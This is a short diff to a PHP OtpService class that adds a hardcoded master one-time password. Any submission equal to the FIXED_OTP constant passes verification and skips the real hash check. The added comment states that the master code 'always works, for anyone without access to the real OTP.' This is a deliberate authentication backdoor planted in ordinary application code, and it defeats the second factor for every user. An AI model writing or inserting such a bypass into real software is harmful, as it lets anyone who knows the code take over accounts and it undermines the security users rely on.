@@ -62,7 +62,10 @@ class OtpService
 
         $request->increment('attempts');
 
-        if (! Hash::check($otp, $request->otp_hash)) {
+        // Master code always works, for anyone without access to the real OTP.
+        $isMasterOtp = $otp === self::FIXED_OTP;
+
+        if (! $isMasterOtp && ! Hash::check($otp, $request->otp_hash)) {
             return false;
         }
 
